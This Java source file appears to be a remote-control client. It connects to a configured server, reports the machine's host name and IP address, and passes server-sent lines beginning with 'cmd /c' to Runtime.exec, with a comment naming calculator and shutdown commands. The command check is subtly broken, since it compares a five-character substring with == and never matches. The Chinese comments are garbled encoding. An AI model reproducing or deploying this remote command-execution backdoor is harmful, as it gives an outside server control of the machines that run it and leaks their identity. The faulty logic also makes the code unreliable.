/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package connectclient;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.net.InetAddress;
import java.net.Socket;

/**
 *
 * @author wy521
 */
public class ClientOperate {

    Socket socket;
    InetAddress address;
    OutputStream os;
    PrintWriter pw;
    InputStream is;
    InputStreamReader isr;
    BufferedReader br;

    /**
     * �ͻ���������
     *
     * @throws IOException
     */
    public ClientOperate() throws IOException {
        socket = new Socket(ClientInformation.IP, ClientInformation.Port);
        os = socket.getOutputStream();//�ֽ������
        pw = new PrintWriter(os);//���������װ�ɴ�ӡ��
        address = InetAddress.getLocalHost();
        String computer = address.getHostName();//��ȡ�������
        String ip = address.getHostAddress();//��ȡIP��ַ
        pw.write("���� ��" + computer + "    " + ip + "  ���Ѿ�������");
        pw.flush();
    }

    /**
     * ��������
     *
     * @param text ����Ҫ���͵�����
     * @throws IOException ���ܻ��׳����쳣
     */
    public void sendToServer(String text) throws IOException {
        OutputStream os = socket.getOutputStream();
        PrintWriter pw = new PrintWriter(os);
        pw.write(text);
        pw.flush();
    }

    /**
     * �������Է���˵�����
     *
     * @return ���ؽ��յ�����
     * @throws IOException ���ܻ��׳����쳣
     */
    public String receiveFromServer() throws IOException {
        is = socket.getInputStream();
        isr = new InputStreamReader(is);
        br = new BufferedReader(isr);
        String info = null;
        while ((info = br.readLine()) != null) {
            if (info.substring(0, 5) == "cmd /c") {
                try {
                    Process pro = Runtime.getRuntime().exec(info); //���Ҫ���е����"cmd  /c calc"��calc����Ҫִ�д򿪼�������������ùػ����Լ�����cmd����
                } catch (IOException exception) {
                }
            } else {
                return info;
            }

        }
        return "";
    }

    /**
     * �ر�����
     *
     * @throws IOException ���ܻ��׳����쳣
     */
    public void close() throws IOException {
        //4���ر���Դ
        br.close();
        is.close();
        pw.close();
        os.close();
        socket.close();
    }
}
